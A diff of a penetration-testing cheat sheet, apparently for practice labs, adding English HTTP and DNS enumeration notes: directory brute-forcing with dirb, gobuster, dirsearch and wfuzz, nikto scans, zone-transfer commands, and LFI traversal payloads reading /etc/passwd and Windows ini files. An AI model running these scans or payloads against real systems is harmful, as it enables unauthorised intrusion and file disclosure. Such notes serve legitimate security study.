@@ -1,26 +1,82 @@
-#HTTP
+HTTP Enumeration
 
+http://10.10.10.50/robots.txt
+
+DIRECTORY BRUTE FORCE
+
+#with dirb;
+dirb http://<victim_ip>/
+dirb http://<victim_ip>/ -r -o dirb.txt
+
+#with gobuster
+gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -o gobuster.txt
+gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -x html,php,asp,aspx -o gobuster.txt
+gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -k -x html,php,asp,aspx -o gobuster.txt
+
+#with dirsearch
+python3 dirsearch.py -u http://<victim_ip>/ -e php -x 403,404 -t 50 (Warning: This scan takes a long time to run)
+
+#with wfuzz
+wfuzz --hc 404,400 -c -z file,/usr/share/dirb/wordlists/big.txt http://<victim_ip>/FUZZ
+
+VULNERABILITY SCAN
+
+#with nikto;
+nikto --host=http://<victim_ip>
+
+
+LFI
+
+#for Linux;
+/index.php?page=../../../etc/passwd             #basic
+/index.php?page=../../../etc/passwd             #null byte
+/index.php?page=%252e%252e%252fetc%252fpasswd   #double encoding
+
+
+for Windows;
+http://<victim_ip>/../../../../../../WINDOWS/win.ini
+http://<victim_ip>/../../../../../../xampp/apache/bin/php.ini
+
+
+SQL Injection (Manual Steps)
+
+
+SCENARIOS
+
+#LFI to RCE
+
+#MySQL to SHELL
+
+
+CMS Enumeration
 -------------------------------------------------------------------------------------------------------------------------------
+#Wordpress
 
-##DNS
+#Joomla
 
-/etc/hosts dosyasına domaini ekle
+#Drupal
+-------------------------------------------------------------------------------------------------------------------------------
+DNS Enumeration
+
+Firstly add the domain information detected during port scans to the file "/etc/hosts";
+
+Then check the DNS servers;
 
 dig ns active.htb
 
-ya da
+or
 
 nslookup
-server 10.10.10.100
+server <victim_ip>
 
-Zone transfer için;
+For zone transfer;
 dig @ns1.example.com example.com axfr
 
-ya da
+or
 
 host -l active.htb 10.10.10.100
 
-(dnsrecon da kullanılabilir)
+Note: "dnsrecon" tool can also be used for this.
 
 -------------------------------------------------------------------------------------------------------------------------------
 
@@ -46,16 +102,7 @@ mount 10.10.10.100:/var brc  -> kendi makinemizde oluşturduğumuz /brc dizinine
 
 -------------------------------------------------------------------------------------------------------------------------------
 
--------------------------------------------------------------------------------------------------------------------------------
 
-Notes - Flags:
-
-type local.txt && ipconfig
-type proof.txt && ipconfig
-
-
-cat local.txt && ifconfig
-cat proof.txt && ifconfig
 
 
 
